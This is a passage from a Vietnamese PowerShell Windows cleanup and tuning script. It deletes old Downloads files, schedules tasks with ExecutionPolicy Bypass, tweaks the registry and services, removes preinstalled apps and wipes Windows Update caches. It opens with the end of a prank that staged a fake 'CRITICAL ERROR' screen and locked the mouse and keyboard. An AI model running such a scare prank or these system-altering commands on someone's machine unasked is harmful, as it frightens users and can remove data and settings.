        Get-Process powershell | Where-Object { $_.MainWindowTitle -eq 'CRITICAL ERROR' } | Stop-Process -Force -ErrorAction SilentlyContinue
        
        $Host.UI.RawUI.WindowTitle = $oldTitle
        $Host.UI.RawUI.ForegroundColor = $oldFg
        $Host.UI.RawUI.BackgroundColor = $oldBg
        $Host.UI.RawUI.CursorSize = $oldCursor
        Clear-Host
        Write-Host '    ==========================================================' -ForegroundColor Green
        Write-Host '      Troll ket thuc: Day chi la hieu ung gia lap an toan.' -ForegroundColor Green
        Write-Host '      Da mo khoa chuot va ban phim. He thong cua ban an toan.' -ForegroundColor Green
        Write-Host '    ==========================================================' -ForegroundColor Green
    }
}

function Show-SelectMenu {
    Write-Host '    Chon cac muc can don dep (Vi du: 1,2,4 hoac all / tat ca):' -ForegroundColor Cyan
    foreach($t in $Script:CleanupTargets){
        $a = if($t.RequireAdmin){' [Admin]'}else{''}
        Write-Host ("      [{0,2}] {1,-11} {2,-30} - {3}{4}" -f $t.Id,$t.Mode,(Fit-Text $t.Name 30),$t.Description,$a)
    }
    Write-Host '    Nhap lua chon cua ban: ' -NoNewline -ForegroundColor Yellow
    $text = Read-Host
    if($text -match '^(all|tat ca)$'){return @($Script:CleanupTargets|ForEach-Object{[int]$_.Id})}
    @($text -split '[,\s]+' | Where-Object{$_ -match '^\d+$'} | ForEach-Object{[int]$_} | Where-Object{$Script:CleanupTargets.Id -contains $_})
}

function New-SafeRestorePoint {
    if(-not(Test-AdminRights)){
        Write-Host '    Yeu cau chay duoi quyen Administrator de tao Restore Point.' -ForegroundColor Yellow
        return
    }
    try{
        Checkpoint-Computer -Description 'Before ClearData Windows Cleanup' -RestorePointType 'MODIFY_SETTINGS'
        Write-Host '    Da tao thanh cong diem khoi phuc he thong (Restore Point).' -ForegroundColor Green
    }catch{
        Write-Host "    Khong the tao diem khoi phuc: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

function Clean-OldDownloads {
    Show-Banner
    Write-Host '    DON DEP TEP TIN CU KHONG SU DUNG (THU MUC DOWNLOADS)' -ForegroundColor Yellow
    Write-Host '    ----------------------------------------------------------' -ForegroundColor DarkCyan
    Write-Host '    Tinh nang nay giup tim va xoa cac tep tin cu trong thu muc Downloads.' -ForegroundColor White
    Write-Host '    Luu y: Chi xoa sau khi ban xem danh sach va xac nhan dong y.' -ForegroundColor Yellow
    Write-Host ''
    
    Write-Host '    Chon nguong thoi gian tep tin khong su dung (ngay sua doi cuoi cung):' -ForegroundColor Cyan
    Write-Host '      [1] Tren 180 ngay (khoang 6 thang)' -ForegroundColor White
    Write-Host '      [2] Tren 365 ngay (1 nam)' -ForegroundColor White
    Write-Host '      [3] Tren 730 ngay (2 nam)' -ForegroundColor White
    Write-Host '      [0] Quay lai menu chinh' -ForegroundColor DarkGray
    Write-Host ''
    Write-Host '    Nhap lua chon cua ban [0-3]: ' -NoNewline -ForegroundColor Yellow
    $sel = Read-Host
    $days = 0
    switch ($sel) {
        '1' { $days = 180 }
        '2' { $days = 365 }
        '3' { $days = 730 }
        default { return }
    }
    
    $cutoff = (Get-Date).AddDays(-$days)
    Write-Host "`n    Dang quet thu muc Downloads cho cac tep sua doi truoc ngay $($cutoff.ToString('dd/MM/yyyy'))..." -ForegroundColor Cyan
    
    $downloadRoots = @(Get-UserRoots | ForEach-Object { Join-Path $_ 'Downloads' } | Where-Object { Test-Path $_ })
    if ($downloadRoots.Count -eq 0) {
        Write-Host '    Khong tim thay thu muc Downloads hop le.' -ForegroundColor Red
        return
    }
    
    $files = @()
    foreach ($dr in $downloadRoots) {
        $found = Get-ChildItem -Path $dr -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -lt $cutoff }
        if ($found) { $files += $found }
    }
    
    if ($files.Count -eq 0) {
        Write-Host '    Khong tim thay tep tin nao cu hon nguong thoi gian da chon.' -ForegroundColor Green
        return
    }
    
    $totalSize = 0L
    foreach ($f in $files) { $totalSize += $f.Length }
    
    Write-Host ("`n    Da tim thay {0} tep tin cu. Tong dung luong: {1}" -f $files.Count, (Format-FileSize $totalSize)) -ForegroundColor Yellow
    Write-Host '    Duoi day la danh sach toi da 20 tep tin co dung luong lon nhat:' -ForegroundColor Cyan
    Write-Host '    ----------------------------------------------------------' -ForegroundColor DarkCyan
    
    $top20 = $files | Sort-Object Length -Descending | Select-Object -First 20
    $idx = 0
    foreach ($f in $top20) {
        $idx++
        Write-Host ("      [{0,2}] {1,12}  {2} (Sua doi: {3})" -f $idx, (Format-FileSize $f.Length), (Fit-Text $f.FullName 60), $f.LastWriteTime.ToString('dd/MM/yyyy')) -ForegroundColor White
    }
    Write-Host '    ----------------------------------------------------------' -ForegroundColor DarkCyan
    Write-Host ''
    
    if (Confirm-YN 'Ban co chac chan muon XOA TOAN BO tep tin cu da tim thay khong?') {
        Write-Host '    Dang tien hanh xoa...' -ForegroundColor Yellow
        $deletedCount = 0
        $freedBytes = 0L
        $i = 0
        foreach ($f in $files) {
            $i++
            Show-ProgressBar $i $files.Count "Dang xoa: $(Fit-Text $f.Name 30)"
            try {
                $len = $f.Length
                Remove-Item -LiteralPath $f.FullName -Force -ErrorAction Stop
                $deletedCount++
                $freedBytes += $len
            } catch {}
        }
        Write-Host ''
        Write-Host ("`n    Da xoa thanh cong {0}/{1} tep tin." -f $deletedCount, $files.Count) -ForegroundColor Green
        Write-Host ("    Da giai phong: {0}" -f (Format-FileSize $freedBytes)) -ForegroundColor Green
        Write-Log "DOWNLOADS CLEAN: Da xoa $deletedCount / $($files.Count) tep tin cu (> $days ngay). Giai phong $(Format-FileSize $freedBytes)"
    } else {
        Write-Host '    Da huy bo thao tac xoa.' -ForegroundColor DarkGray
    }
}

function Register-WeeklyCleanupTask {
    if(-not(Test-AdminRights)){Write-Host '    Yeu cau quyen Admin.' -ForegroundColor Yellow; return}
    $scriptPath = (Join-Path $PSScriptRoot 'ClearData.ps1')
    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -AutoClean -Yes -ExportCsv"
    $trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At 10am
    Register-ScheduledTask -TaskName 'ClearDataWindowsWeeklyClean' -Action $action -Trigger $trigger -Description 'Lich don dep hang tuan tu dong cua ClearData' -Force | Out-Null
    Write-Host '    Da tao lich don dep: Chu nhat hang tuan luc 10:00 sang.' -ForegroundColor Green
}

function Register-DailyAutoScanTask {
    if(-not(Test-AdminRights)){Write-Host '    Yeu cau quyen Admin.' -ForegroundColor Yellow; return}
    $scriptPath = (Join-Path $PSScriptRoot 'ClearData.ps1')
    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -AutoScan -ExportCsv"
    $trigger = New-ScheduledTaskTrigger -Daily -At 9am
    Register-ScheduledTask -TaskName 'ClearDataWindowsDailyScan' -Action $action -Trigger $trigger -Description 'Lich quet tu dong hang ngay cua ClearData' -Force | Out-Null
    Write-Host '    Da tao lich quet tu dong: Quet luc 09:00 sang hang ngay va xuat bao cao CSV.' -ForegroundColor Green
}

function Unregister-ClearDataSchedules {
    if(-not(Test-AdminRights)){Write-Host '    Yeu cau quyen Admin.' -ForegroundColor Yellow; return}
    foreach($name in @('ClearDataWindowsDailyScan','ClearDataWindowsWeeklyClean','ClearDataWindowsWeekly')){
        try { Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue; Write-Host "    Da go bo lich don dep: $name" -ForegroundColor Green } catch {}
    }
}

function Show-ClearDataSchedules {
    foreach($name in @('ClearDataWindowsDailyScan','ClearDataWindowsWeeklyClean','ClearDataWindowsWeekly')){
        try { Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue | Select-Object TaskName,State | Format-Table -AutoSize | Out-String | Write-Host } catch {}
    }
}

function Optimize-NetworkGaming {
    Write-Host ''
    Write-Host '    TOI UU HOA MANG & WIFI (GIAM PING, CHONG LAG)' -ForegroundColor Cyan
    if (-not (Confirm-YN 'Ban co muon thuc hien toi uu hoa khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    Vui long chay duoi quyen Administrator de toi uu TCP.' -ForegroundColor Yellow; return }
    try {
        ipconfig /flushdns | Out-Null
        netsh int tcp set global autotuninglevel=normal | Out-Null
        netsh int tcp set heuristics disabled | Out-Null
        netsh int tcp set global rss=enabled | Out-Null
        Write-Host '    [OK] Da toi uu TCP Auto-Tuning, RSS va Heuristics' -ForegroundColor Green
        Write-Host '    [OK] Lam sach bo nho dem DNS (Flush DNS)' -ForegroundColor Green
        Write-Host '    Hoan tat toi uu mang. Ket noi mang/WiFi cua ban da duoc toi uu.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Khong the thuc hien toi uu mang' -ForegroundColor Red }
}

function Repair-SystemFiles {
    Write-Host ''
    Write-Host '    SUA LOI FILE HE THONG (SFC & DISM)' -ForegroundColor Cyan
    Write-Host '    Qua trinh nay co the mat 15-30 phut tuy toc do o cung.' -ForegroundColor Yellow
    if (-not (Confirm-YN 'Ban co muon bat dau quet va sua loi ngay khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    Vui long chay duoi quyen Administrator.' -ForegroundColor Yellow; return }
    try {
        Write-Host '    [1/2] Dang chay SFC ScanNow...' -ForegroundColor Cyan
        sfc /scannow
        Write-Host '    [2/2] Dang chay DISM RestoreHealth...' -ForegroundColor Cyan
        dism /online /cleanup-image /restorehealth
        Write-Host '    Hoan tat sua loi he thong. Vui long khoi dong lai may tinh de ap dung.' -ForegroundColor Green
    } catch {
        Write-Host '    [LOI] Phat sinh loi trong qua trinh sua chua.' -ForegroundColor Red
    }
}

function Reset-NetworkDeep {
    Write-Host ''
    Write-Host '    DAT LAI MANG TOAN DIEN (RESET SAU)' -ForegroundColor Red
    Write-Host '    Se chay: Winsock reset, dat lai IP stack, cau hinh WinHTTP proxy, xoa cache DNS.' -ForegroundColor Yellow
    Write-Host '    Chu y: Yeu cau khoi dong lai may tinh; cac cai dat IP tinh/VPN/Proxy tuy chinh se bi xoa.' -ForegroundColor Yellow
    if ((Read-Host '    Nhap RESET de xac nhan chay: ') -ne 'RESET') { Write-Host '    Da huy bo thao tac.' -ForegroundColor DarkGray; return }
    if (-not (Test-AdminRights)) { Write-Host '    Vui long chay duoi quyen Administrator.' -ForegroundColor Yellow; return }
    try { netsh winsock reset | Out-Null; Write-Host '    [OK] Winsock reset thanh cong' -ForegroundColor Green } catch { Write-Host '    [LOI] Winsock reset that bai' -ForegroundColor Red }
    try { netsh int ip reset | Out-Null; Write-Host '    [OK] Khoi phuc IP Stack thanh cong' -ForegroundColor Green } catch { Write-Host '    [LOI] Khoi phuc IP Stack that bai' -ForegroundColor Red }
    try { netsh winhttp reset proxy | Out-Null; Write-Host '    [OK] Khoi phuc WinHTTP proxy thanh cong' -ForegroundColor Green } catch { Write-Host '    [BO QUA] Cau hinh proxy WinHTTP khong doi' -ForegroundColor Yellow }
    try { ipconfig /flushdns | Out-Null; Write-Host '    [OK] Lam sach bo nho dem DNS thanh cong' -ForegroundColor Green } catch {}
    Write-Host '    Hoan tat. Ban can khoi dong lai may tinh de thay doi co hieu luc.' -ForegroundColor Green
}

function Enable-UltimatePerformance {
    Write-Host ''
    Write-Host '    BAT CHE DO SIEU HIEU NANG (ULTIMATE PERFORMANCE)' -ForegroundColor Cyan
    if (-not (Confirm-YN 'Ban co muon kich hoat che do Ultimate Performance khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    Vui long chay duoi quyen Administrator.' -ForegroundColor Yellow; return }
    try {
        $scheme = powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 | Out-String
        if ($scheme -match "GUID:\s+([a-zA-Z0-9\-]+)") {
            $guid = $matches[1]
            powercfg -setactive $guid | Out-Null
            Write-Host '    [OK] Da kich hoat thanh cong Power Plan: Ultimate Performance' -ForegroundColor Green
        } else {
            powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c | Out-Null
            Write-Host '    [OK] Da kich hoat Power Plan: High Performance (Hieu nang cao)' -ForegroundColor Green
        }
    } catch { Write-Host '    [LOI] Khong the thay doi Power Plan.' -ForegroundColor Red }
}

function Disable-WindowsTelemetry {
    Write-Host ''
    Write-Host '    TAT THEO DOI & DICH VU NGAM RAC (TELEMETRY)' -ForegroundColor Cyan
    Write-Host '    Giup bao mat quyen rieng tu, tiet kiem RAM va CPU chay ngam.' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon tat cac dich vu nay khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    Vui long chay duoi quyen Administrator.' -ForegroundColor Yellow; return }
    try {
        Stop-Service -Name "DiagTrack" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "DiagTrack" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "dmwappushservice" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "dmwappushservice" -StartupType Disabled -ErrorAction SilentlyContinue
        if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo")) {
            New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" -Force | Out-Null
        }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" -Name "Enabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Write-Host '    [OK] Da tat dich vu thu thap du lieu DiagTrack' -ForegroundColor Green
        Write-Host '    [OK] Da tat dich vu WAP Push Routing' -ForegroundColor Green
        Write-Host '    [OK] Da tat ID quang cao an danh cua Microsoft' -ForegroundColor Green
        Write-Host '    Hoan tat. May tinh ban se nhe va rieng tu hon.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh tat dich vu.' -ForegroundColor Red }
}

function Optimize-GamingPerformance {
    Write-Host ''
    Write-Host '    TOI UU HIEU SUAT CHOI GAME (GAMING TWEAKS)' -ForegroundColor Cyan
    if (-not (Confirm-YN 'Ban co muon thuc hien toi uu hoa Registry cho Game khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    Vui long chay duoi quyen Administrator.' -ForegroundColor Yellow; return }
    try {
        if (-not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile")) {
            New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" -Force | Out-Null
        }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" -Name "NetworkThrottlingIndex" -Value 0xffffffff -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" -Name "SystemResponsiveness" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        
        if (-not (Test-Path "HKCU:\System\GameConfigStore")) {
            New-Item -Path "HKCU:\System\GameConfigStore" -Force | Out-Null
        }
        Set-ItemProperty -Path "HKCU:\System\GameConfigStore" -Name "GameDVR_Enabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        
        if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\GameDVR")) {
            New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\GameDVR" -Force | Out-Null
        }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\GameDVR" -Name "AppCaptureEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        
        Write-Host '    [OK] Da tinh chinh Registry: Giam do tre mang (Network Throttling)' -ForegroundColor Green
        Write-Host '    [OK] Da tinh chinh Registry: Uu tien CPU cho Game (System Responsiveness)' -ForegroundColor Green
        Write-Host '    [OK] Da tat quay video nen Game DVR (Tang FPS)' -ForegroundColor Green
        Write-Host '    Hoan tat. Vui long khoi dong lai may tinh de ap dung.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh toi uu.' -ForegroundColor Red }
}

function Remove-WindowsBloatware {
    Write-Host ''
    Write-Host '    XOA UNG DUNG RAC CAI SAN (SAFE DEBLOAT BLOATWARE)' -ForegroundColor Cyan
    Write-Host '    Se go bo cac ung dung nhu: TikTok, Candy Crush, Solitaire, Xbox Game Bar...' -ForegroundColor DarkGray
    Write-Host '    Luu y: Se TU DONG tao Diem Khoi phuc (Restore Point) truoc khi xoa de dam bao an toan.' -ForegroundColor Yellow
    if (-not (Confirm-YN 'Ban co chac chan muon xoa cac ung dung rac khong?')) { return }
    
    New-SafeRestorePoint
    
    Write-Host '    Dang tien hanh go bo, vui long doi...' -ForegroundColor Cyan
    $bloatware = @(
        "*BingNews*", "*BingWeather*", "*CandyCrush*", "*DisneyMagicKingdoms*", "*Duolingo*",
        "*EclipseManager*", "*Facebook*", "*FitbitCoach*", "*Flipboard*", "*HiddenCity*",
        "*MarchofEmpires*", "*MinecraftUWP*", "*Netflix*", "*PandoraMedia*", "*PhototasticCollage*",
        "*PicsArt*", "*Plex*", "*Print3D*", "*Spotify*", "*Sway*", "*Twitter*",
        "*Viber*", "*WindowsAlarms*", "*WindowsFeedbackHub*", "*WindowsMaps*",
        "*WindowsSoundRecorder*", "*XboxApp*", "*XboxGamingOverlay*", "*XboxIdentityProvider*",
        "*XboxSpeechToTextOverlay*", "*YourPhone*", "*ZuneMusic*", "*ZuneVideo*"
    )
    $removed = 0
    foreach ($app in $bloatware) {
        $pkgs = Get-AppxPackage -Name $app -AllUsers -ErrorAction SilentlyContinue
        if ($pkgs) {
            foreach ($pkg in $pkgs) {
                Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue
                $removed++
            }
        }
        $provs = Get-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -like $app }
        if ($provs) {
            foreach ($prov in $provs) {
                Remove-AppxProvisionedPackage -Online -PackageName $prov.PackageName -ErrorAction SilentlyContinue
                $removed++
            }
        }
    }
    Write-Host "    [OK] Da go bo hoan toan $removed goi ung dung rac khoi may tinh." -ForegroundColor Green
}

function Optimize-StartMenuAndCortana {
    Write-Host ''
    Write-Host '    TAT BING SEARCH & CORTANA (TANG TOC START MENU)' -ForegroundColor Cyan
    Write-Host '    Giup tim kiem file cuc nhanh va xoa tro ly ao ngonson RAM.' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon toi uu hoa Start Menu khong?')) { return }
    try {
        if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search")) {
            New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" -Force | Out-Null
        }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" -Name "BingSearchEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search" -Name "CortanaConsent" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        
        if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search")) {
            New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Force | Out-Null
        }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name "AllowCortana" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name "DisableWebSearch" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        
        Write-Host '    [OK] Da tat Bing Search tren Start Menu.' -ForegroundColor Green
        Write-Host '    [OK] Da vo hieu hoa Cortana.' -ForegroundColor Green
        Write-Host '    Hoan tat. Vui long khoi dong lai may tinh hoac Windows Explorer de ap dung.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh toi uu.' -ForegroundColor Red }
}

function Optimize-DiskDrives {
    Write-Host ''
    Write-Host '    TOI UU HOA & TRIM O CUNG (SSD/HDD OPTIMIZE)' -ForegroundColor Cyan
    Write-Host '    Giup SSD hoat dong nhanh hon, ben hon va HDD chong phan manh.' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon chay Optimize-Volume khong (Co the mat tu vai giay den vai phut)?')) { return }
    try {
        Write-Host '    Dang tien hanh toi uu tat ca cac o dia. Vui long doi...' -ForegroundColor Yellow
        $drives = Get-Volume | Where-Object { $_.DriveType -eq 'Fixed' -and $_.DriveLetter }
        foreach ($d in $drives) {
            Write-Host "      Dang toi uu o dia $($d.DriveLetter): ..." -NoNewline
            Optimize-Volume -DriveLetter $d.DriveLetter -ErrorAction SilentlyContinue | Out-Null
            Write-Host " Xong!" -ForegroundColor Green
        }
        Write-Host '    [OK] Tat ca o cung da duoc toi uu (TRIM / Defrag) thanh cong.' -ForegroundColor Green
    } catch { Write-Host "    [LOI] Phat sinh loi: $($_.Exception.Message)" -ForegroundColor Red }
}

function Optimize-UserExperience {
    Write-Host ''
    Write-Host '    TOI UU GIAO DIEN & TRAI NGHIEM (UI/UX TWEAKS)' -ForegroundColor Cyan
    Write-Host '    - Hien thi duoi mo rong tep tin va tep an (Tang cuong bao mat).' -ForegroundColor DarkGray
    Write-Host '    - Tat gia toc chuot (Mouse Acceleration) ho tro choi Game FPS.' -ForegroundColor DarkGray
    Write-Host '    - Tat loi nhac phiem dinh (Sticky Keys) gay phien toai.' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon thuc hien cac toi uu nay khong?')) { return }
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Control Panel\Mouse" -Name "MouseSpeed" -Value "0" -Type String -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Control Panel\Mouse" -Name "MouseThreshold1" -Value "0" -Type String -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Control Panel\Mouse" -Name "MouseThreshold2" -Value "0" -Type String -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility\StickyKeys" -Name "Flags" -Value "506" -Type String -ErrorAction SilentlyContinue
        
        Write-Host '    [OK] Da bat hien thi duoi tep va tep tin an.' -ForegroundColor Green
        Write-Host '    [OK] Da tat gia toc chuot (Mouse Acceleration).' -ForegroundColor Green
        Write-Host '    [OK] Da tat nhac nho Sticky Keys.' -ForegroundColor Green
        Write-Host '    Hoan tat. Vui long khoi dong lai de ap dung toan bo.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh toi uu.' -ForegroundColor Red }
}

function Optimize-PrivacyAndBackground {
    Write-Host ''
    Write-Host '    TOI UU BAO MAT & QUYEN RIENG TU (PRIVACY TWEAKS)' -ForegroundColor Cyan
    Write-Host '    - Tat theo doi Lich su hoat dong (Activity History).' -ForegroundColor DarkGray
    Write-Host '    - Ngan cac ung dung chay ngam khong can thiet.' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon thuc hien cac toi uu nay khong?')) { return }
    try {
        if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications")) { New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" -Force | Out-Null }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" -Name "GlobalUserDisabled" -Value 1 -Type DWord -ErrorAction SilentlyContinue
        
        if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System")) { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Force | Out-Null }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableActivityFeed" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "PublishUserActivities" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "UploadUserActivities" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        
        Write-Host '    [OK] Da chan toan bo ung dung chay ngam (Background Apps).' -ForegroundColor Green
        Write-Host '    [OK] Da tat theo doi lich su hoat dong.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh toi uu.' -ForegroundColor Red }
}

function Optimize-PowerAndStorage {
    Write-Host ''
    Write-Host '    TOI UU NGUON & LUU TRU (FAST STARTUP & HIBERNATION)' -ForegroundColor Cyan
    Write-Host '    - Tat Fast Startup de tranh cac loi ngam cua Windows va sua loi khong the tat may.' -ForegroundColor DarkGray
    Write-Host '    - Tat Hibernation (Ngu dong) de giai phong nhieu GB o dia C:.' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon thuc hien cac toi uu nay khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    Vui long chay duoi quyen Administrator.' -ForegroundColor Yellow; return }
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Power" -Name "HiberbootEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        powercfg.exe /hibernate off | Out-Null
        
        Write-Host '    [OK] Da tat Fast Startup (Khoi dong nhanh).' -ForegroundColor Green
        Write-Host '    [OK] Da tat Hibernation (Giai phong khong gian o dia).' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh toi uu.' -ForegroundColor Red }
}

function Optimize-WSL {
    Write-Host ''
    Write-Host '    NEN O DIA AO WSL2 (COMPACT WSL)' -ForegroundColor Cyan
    Write-Host '    Giai phong dung luong da xoa ben trong WSL2 (chi ho tro he thong co cai dat WSL).' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon thuc hien toi uu hoa WSL khong?')) { return }
    if (-not (Get-Command wsl.exe -ErrorAction SilentlyContinue)) {
        Write-Host '    [LOI] He thong chua cai dat hoac khong ho tro WSL.' -ForegroundColor Red
        return
    }
    try {
        Write-Host '    Dang tien hanh tat WSL va thu gon o dia. Qua trinh co the mat vai phut...' -ForegroundColor Yellow
        wsl.exe --shutdown | Out-Null
        $dists = wsl.exe --list --quiet | Where-Object { $_ -match '\S' } | ForEach-Object { $_ -replace "`0", "" }
        if (-not $dists) {
            Write-Host '    [LOI] Khong tim thay ban phan phoi WSL nao.' -ForegroundColor Yellow
            return
        }
        foreach ($d in $dists) {
            Write-Host "      Dang thu gon ban phan phoi: $d ..." -ForegroundColor Cyan
            wsl.exe --manage $d --set-sparse true | Out-Null
            Write-Host "      [OK] Da toi uu $d" -ForegroundColor Green
        }
        Write-Host '    Hoan tat thu gon WSL.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi trong qua trinh toi uu WSL.' -ForegroundColor Red }
}

function Restart-WindowsExplorer {
    Write-Host ''
    Write-Host '    KHOI DONG LAI WINDOWS EXPLORER (RESTART EXPLORER)' -ForegroundColor Cyan
    Write-Host '    Giup giai phong RAM do memory leak cua Explorer va lam moi thanh Taskbar.' -ForegroundColor DarkGray
    if (-not (Confirm-YN 'Ban co muon khoi dong lai Explorer ngay bay gio khong? (Man hinh se nhay mot chut)')) { return }
    try {
        Stop-Process -Name explorer -Force
        Write-Host '    [OK] Da khoi dong lai Windows Explorer.' -ForegroundColor Green
    } catch { Write-Host '    [LOI] Phat sinh loi khi khoi dong lai Explorer.' -ForegroundColor Red }
}

function Reset-WindowsUpdateDeep {
    Write-Host ''
    Write-Host '    KHOI PHUC & XOA TRANG WINDOWS UPDATE (HARD RESET)' -ForegroundColor Cyan
    Write-Host '    Xoa toan bo thu muc SoftwareDistribution va catroot2 de sua loi Update.' -ForegroundColor DarkGray
    Write-Host '    Luu y: May tinh se phai kiem tra ban cap nhat lai tu dau.' -ForegroundColor Yellow
    if (-not (Confirm-YN 'Ban co chac chan muon thuc hien khong?')) { return }
    if (-not (Test-AdminRights)) { Write-Host '    [LOI] Vui long chay duoi quyen Administrator.' -ForegroundColor Red; return }
    try {
        Write-Host '    Dang dung cac dich vu Update...' -ForegroundColor Yellow
        Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
        Stop-Service -Name cryptSvc -Force -ErrorAction SilentlyContinue
        Stop-Service -Name bits -Force -ErrorAction SilentlyContinue
        Stop-Service -Name msiserver -Force -ErrorAction SilentlyContinue
        
        Write-Host '    Dang xoa thu muc bo nho dem...' -ForegroundColor Cyan
        if (Test-Path "C:\Windows\SoftwareDistribution") { Remove-Item "C:\Windows\SoftwareDistribution" -Recurse -Force -ErrorAction SilentlyContinue }
        if (Test-Path "C:\Windows\System32\catroot2") { Remove-Item "C:\Windows\System32\catroot2" -Recurse -Force -ErrorAction SilentlyContinue }
        
        Write-Host '    Dang khoi dong lai cac dich vu...' -ForegroundColor Yellow
        Start-Service -Name wuauserv -ErrorAction SilentlyContinue
        Start-Service -Name cryptSvc -ErrorAction SilentlyContinue
        Start-Service -Name bits -ErrorAction SilentlyContinue
        Start-Service -Name msiserver -ErrorAction SilentlyContinue
        
        Write-Host '    [OK] Da khoi phuc hoan toan Windows Update.' -ForegroundColor Green
